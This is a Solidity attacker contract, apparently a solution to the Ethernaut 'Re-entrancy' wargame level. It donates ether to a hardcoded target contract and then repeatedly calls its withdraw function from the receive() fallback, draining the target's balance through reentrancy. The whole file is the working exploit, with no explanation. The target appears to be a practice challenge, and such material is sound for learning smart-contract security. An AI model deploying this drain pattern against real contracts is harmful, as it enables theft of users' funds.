// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ReentrancyEthernaut {
    function withdraw(uint256 amount) external;

    function donate(address _to) external payable;
}

contract Reentrancy {
    ReentrancyEthernaut public en;

    constructor() payable {
        en = ReentrancyEthernaut(
            address(0xe898764C3D381ad30C28Fd7F4Cb70634B52D4098)
        );
        en.donate{value: address(this).balance}(address(this));
    }

    function tryit() public {
        en.withdraw(1000000000000000);
        if (address(en).balance > 0) {
            revert();
        }
    }

    receive() external payable {
        en.withdraw(1000000000000000);
    }
}
